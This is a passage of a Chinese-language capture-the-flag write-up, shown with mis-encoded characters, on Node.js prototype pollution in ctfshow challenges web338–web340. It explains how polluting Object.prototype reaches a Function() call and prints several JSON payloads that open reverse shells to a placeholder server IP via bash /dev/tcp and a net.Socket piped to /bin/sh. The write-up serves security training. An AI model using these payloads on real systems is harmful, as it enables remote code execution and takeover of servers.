alt="image.png"></p><p>æˆåŠŸåå¼¹ shell</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836758279-1a6d1c18-afe3-4c6c-9721-cea981b25e6c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836758279-1a6d1c18-afe3-4c6c-9721-cea981b25e6c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¸è¿‡ snyk ç»™å‡ºçš„ poc ç”¨ <code>filename</code> å‚æ•°åˆ©ç”¨å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œ ä¸å¤ªæ¸…æ¥šä¸ºå•¥ã€‚ã€‚å³</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;filename&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿è®°å½•ä¸€ä¸‹ node é¡¹ç›®æœ¬åœ°å¯åŠ¨æ–¹æ³•ï¼Œåœ¨é¡¹ç›®æ–‡ä»¶è¿è¡Œä¸‹é¢å‘½ä»¤å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619837473151-eca98d9e-765c-4eee-8161-edcc0328d706.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619837473151-eca98d9e-765c-4eee-8161-edcc0328d706.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>é»˜è®¤ç«¯å£ä¸º <code>3000</code></p><h2 id="web339-åŸå‹é“¾æ±¡æŸ“"><a href="#web339-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web339 åŸå‹é“¾æ±¡æŸ“ +"></a>web339 åŸå‹é“¾æ±¡æŸ“ +</h2><span class='btn'><a class="button"  title='node/v10.19.0'><i class='fas fa-tag'></i>node/v10.19.0</a></span><p>é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç </p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619686504884-e7563cf5-365e-44d1-acff-1b95a5827a7b.zip">ğŸ“web339.zip</a></p><p>å’Œ web338 æœ‰ç‚¹ç›¸ä¼¼ï¼Œä¸è¿‡ä¸åŒç‚¹æ˜¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">....</span><br><span class="line">utils.copy(user,req.body);</span><br><span class="line"><span class="keyword">if</span>(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>flag</code> æ˜¯å˜é‡ï¼Œå…·ä½“å€¼ä¸çŸ¥</p><p>ç„¶åè¿˜å¤šäº†ä¸ª <code>api.js</code> ï¼Œä¸»è¦å…³æ³¨è¿™è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.render(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;);</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸æ˜¯å’Œ web338 é‡Œçš„å‚è€ƒé“¾æ¥ PHITHON å¸ˆå‚…å‡ºçš„ Code-Breaking 2018 Thejs å¦‚å‡ºä¸€è¾™ï¼Ÿå³å¯ä»¥ RCEï¼Œå› ä¸ºè¿™é‡Œå¯æ±¡æŸ“ç‚¹å­˜åœ¨çš„åŒ¿åå‡½æ•°è°ƒç”¨</p><p><a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><p><a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619788917182-da9b75b5-e2e0-47ff-bc66-4eee3514dcd6.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619788917182-da9b75b5-e2e0-47ff-bc66-4eee3514dcd6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä»¿ç…§é¢˜ç›®ä¸­çš„ä»£ç ï¼Œå…ˆå†™ä¸ªå°demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">user = &#123;&#125;</span><br><span class="line">body = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return 2233&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line">copy(user, body)</span><br><span class="line">&#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790130420-39ba77d6-b64a-4dd6-8061-1fdf69a019aa.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790130420-39ba77d6-b64a-4dd6-8061-1fdf69a019aa.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¸ºä»€ä¹ˆ <code>query</code> çš„å€¼æ˜¯ <code>2233</code> å‘¢ï¼Ÿä¹Ÿå°±æ˜¯ä¸ºå•¥ä¼šè¢«è°ƒç”¨äº†å‘¢ï¼Ÿ</p><p>é¦–å…ˆçœ‹çœ‹ <code>query</code> å€¼æ˜¯å¦‚ä½•è¢«æ”¹å˜çš„ï¼Œå…¶å®å°±æ˜¯é€šè¿‡ web338 çš„åŸå‹é“¾æ±¡æŸ“ï¼Œå³ JS ä¸­æ‰€æœ‰çš„å¯¹è±¡çš„åŸå‹éƒ½å¯ä»¥ç»§æ‰¿åˆ° <code>Object</code>ï¼Œç„¶åç»ˆç‚¹æ˜¯ <code>null</code> å¯¹è±¡</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790602513-1290e5ea-29bc-41f3-a91c-8b0d93bf0deb.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790602513-1290e5ea-29bc-41f3-a91c-8b0d93bf0deb.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å¦‚ web338 ä¸­æ‰€è¯´çš„ï¼Œå½“åœ¨å½“å‰ä¸Šä¸‹æ–‡æ‰¾ä¸åˆ°ç›¸åº”å¯¹è±¡æ—¶ï¼Œä¼šéå† <code>Object</code> å¯¹è±¡æ˜¯å¦å­˜åœ¨ç›¸åº”çš„å±æ€§ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790802183-0104e1c4-0ab1-4bd1-957c-ce38d1551dd8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790802183-0104e1c4-0ab1-4bd1-957c-ce38d1551dd8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>åˆ°è¿™é‡Œå°±å¾ˆæ¸…æ¥šçš„çŸ¥é“äº†ï¼Œä¸ºä»€ä¹ˆ <code>query</code> çš„å€¼æ˜¯ <code>&quot;return 2233&quot;</code> ï¼Œå› ä¸ºåœ¨è°ƒç”¨ <code>copy</code> æ—¶ï¼ŒåŸå‹é“¾è¢«æ±¡æŸ“äº†ã€‚</p><p>è‡³äº <code>&#123; query: Function(query)(query)&#125;</code> ä¸ºä½•ä¸º <code>&#123; query: 2233 &#125;</code></p><p>JS çš„å‡½æ•°å®é™…ä¸Šéƒ½æ˜¯ä¸€ä¸ª <code>Function</code> å¯¹è±¡ï¼Œå®ƒçš„å‚æ•°ä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Function</span> ([arg1[, arg2[, ...argN]],] functionBody)</span><br></pre></td></tr></table></figure><p>å†™ä¸ªå°demo</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619791459250-37753d01-6c88-4e63-85a7-26100dfe77db.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619791459250-37753d01-6c88-4e63-85a7-26100dfe77db.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å³ <code>Function</code> å¯¹è±¡ä¼ å…¥æ„é€ å‡½æ•°é‡Œçš„å‰é¢å‚æ•°æ˜¯å‡½æ•°çš„å½¢å‚ï¼Œå½“ç„¶å¯ä»¥çœç•¥ï¼Œæœ€åçš„å½¢å‚å†™å‡½æ•°ä½“ã€‚</p><p>å…¶å®ä½œç”¨å’Œ <code>eval</code> æœ‰ç‚¹ç±»ä¼¼ï¼Œè¯¦ç»†å¯ä»¥çœ‹</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p><p>è‡³æ­¤ï¼Œåˆ©ç”¨æ€è·¯æ˜ç¡®äº†ï¼Œåªè¦æ±¡æŸ“äº† <code>query</code> å¯¹è±¡ï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„æˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç ï¼Œæ¯”å¦‚åå¼¹ä¸ª shell å†è·å– flag ~</p><p>ç„¶åæ±¡æŸ“ç‚¹å’Œ web338 ä¸€è‡´ï¼Œåœ¨ <code>login.js</code> é‡Œçš„ <code>utils.copy(user,req.body);</code> ï¼Œä»£ç æ‰§è¡Œçš„è§¦å‘ç‚¹åœ¨ <code>api.js</code> çš„ <code>res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;);</code> å¤„ã€‚</p><p>payload ï¼Œè¿™é‡Œç”¨ nodejs åŸç”Ÿ socketï¼Œé˜²æ­¢å› ç³»ç»Ÿè¿è¡Œç¯å¢ƒé—®é¢˜ shell å¼¹ä¸å›æ¥ï¼Œè¿™é‡ŒæœåŠ¡å™¨çš„ç›‘å¬ç«¯å£ä¸º <code>2233</code> ï¼Œç„¶åå¦‚ä½•æ˜¯ windows ç³»ç»Ÿå°±æŠŠ <code>/bin/sh</code> æ¢æˆ <code>cmd.exe</code> åº”è¯¥å°±å¯ä»¥äº†ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;æœåŠ¡å™¨IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…ˆæœ¬åœ°è¯•è¯•ï¼Œè¿™é‡ŒæœåŠ¡å™¨ç›‘å¬ç«¯å£ä¸º <code>2233</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">user = &#123;&#125;</span><br><span class="line">body = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(\&#x27;net\&#x27;),cp = require(\&#x27;child_process\&#x27;),sh = cp.spawn(\&#x27;/bin/sh\&#x27;, []);var client = new net.Socket();client.connect(2233, \&#x27;æœåŠ¡å™¨IP\&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line">copy(user, body)</span><br><span class="line">&#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793178120-2e6e58a4-b750-4c6b-a7de-8cf9a2f60b64.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793178120-2e6e58a4-b750-4c6b-a7de-8cf9a2f60b64.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793198542-377ce54f-3687-4a88-a687-11717244f36e.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793198542-377ce54f-3687-4a88-a687-11717244f36e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>okï¼Œæ²¡å•¥å¤§é—®é¢˜ã€‚</p><p>å…ˆ POST ä¸€ä¸‹ <code>login</code> æ¥å£ï¼Œæ±¡æŸ“ <code>query</code> å¯¹è±¡</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793434141-8c892952-f7cf-461d-b4f4-b261365597f6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793434141-8c892952-f7cf-461d-b4f4-b261365597f6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç„¶åç›´æ¥ POST ä¸€ä¸‹ <code>api</code> æ¥å£å³å¯ã€‚</p><p>emmï¼Œå‘ç°ä¸è¡Œï¼Œä¹‹åè®¿é—® <code>/login</code> å’Œ <code>/api</code> æ¥å£éƒ½æ˜¯ <code>404 æ‰¾ä¸åˆ°æ–‡ä»¶</code> ï¼Œshell ä¹Ÿåå¼¹ä¸å›æ¥ã€‚</p><p>è¯•è¯•åˆ«äººçš„</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796525635-ef217393-2d02-4228-a2aa-1ce9e7876933.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796525635-ef217393-2d02-4228-a2aa-1ce9e7876933.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796551640-9d0beceb-3b78-4a2e-b77f-19ea45c2cecd.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796551640-9d0beceb-3b78-4a2e-b77f-19ea45c2cecd.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796495423-4c858c2e-cbf8-4c26-96f1-35206b50b05f.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796495423-4c858c2e-cbf8-4c26-96f1-35206b50b05f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä»”ç»†å¯¹æ¯”äº†ä¸€ä¸‹ï¼Œå‘ç°äº†ï¼Œæ„Ÿè§‰æ˜¯å‘½åç©ºé—´é—®é¢˜ï¼Œå³ <code>require</code> å¯èƒ½ä¸è¢«è¯†åˆ«ï¼Œå°è¯•æŠŠ require æ”¹ä¸º <code>global.process.mainModule.constructor._load</code> ï¼ŒåŒæ ·æœåŠ¡å™¨ç›‘å¬ç«¯å£ä¸º <code>2233</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;æœåŠ¡å™¨IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯å…ˆ POST /login æ¥å£æ±¡æŸ“ <code>query</code> å¯¹è±¡</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838195166-c3b39c68-4095-4a87-b5b4-793e3c217290.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838195166-c3b39c68-4095-4a87-b5b4-793e3c217290.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è®¿é—®ä¸‹ /api æ¥å£</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838256467-488bab08-9d13-4910-bfcf-2d833730b60d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838256467-488bab08-9d13-4910-bfcf-2d833730b60d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>åå¼¹ shell å¹¶è·å– flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838313191-f653eafe-5665-48af-8b1b-ca85b765776c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619838313191-f653eafe-5665-48af-8b1b-ca85b765776c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç„¶åé¡ºä¾¿ç¿»äº†ä¸ªé“¾æ¥ï¼Œå¥½åƒç¡®å®å¦‚æ­¤~</p><p><a href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a></p><p>å› ä¸º node æ˜¯åŸºäº chrome v8 å†…æ ¸çš„ï¼Œè¿è¡Œæ—¶ï¼Œå‹æ ¹å°±ä¸ä¼šæœ‰ <code>require</code> è¿™ç§å…³é”®å­—ï¼Œæ¨¡å—åŠ è½½ä¸è¿›æ¥ï¼Œè‡ªç„¶ shell å°±åå¼¹ä¸äº†äº†ã€‚ä½†åœ¨ nodeäº¤äº’ç¯å¢ƒï¼Œæˆ–è€…å†™ js æ–‡ä»¶æ—¶ï¼Œé€šè¿‡ node è¿è¡Œä¼šè‡ªåŠ¨æŠŠ <code>require</code> è¿›è¡Œç¼–è¯‘ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå…¶ä»–è§£ï¼Œè§ web338 ä¸­çš„ <code>ejs</code> RCEï¼Œä¸€æ ·çš„EXPã€æ­¥éª¤å’Œåˆ©ç”¨æ–¹å¼</p><h2 id="web340-åŸå‹è¿æ±¡æŸ“"><a href="#web340-åŸå‹è¿æ±¡æŸ“" class="headerlink" title="web340 åŸå‹è¿æ±¡æŸ“ ++"></a>web340 åŸå‹è¿æ±¡æŸ“ ++</h2><span class='btn'><a class="button"  title='nodejs/v10.19.0'><i class='fas fa-tag'></i>nodejs/v10.19.0</a></span><p>é¢˜ç›®æè¿°å¤„è“å¥äº‘ä¸‹è½½æºç </p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619848191941-9137aba3-47fd-43b8-a3d5-7a2ff56cf183.zip">ğŸ“web340.zip</a></p><p>æå–å…³é”®éƒ¨åˆ†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.userinfo = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.isVIP = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAuthor = <span class="literal">false</span>;     </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.copy(user.userinfo,req.body);</span><br><span class="line"><span class="keyword">if</span>(user.userinfo.isAdmin)&#123;</span><br><span class="line">  res.end(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619849651649-5929789d-e0ee-40c1-b64a-260dbf694cc8.png" class="lazyload" 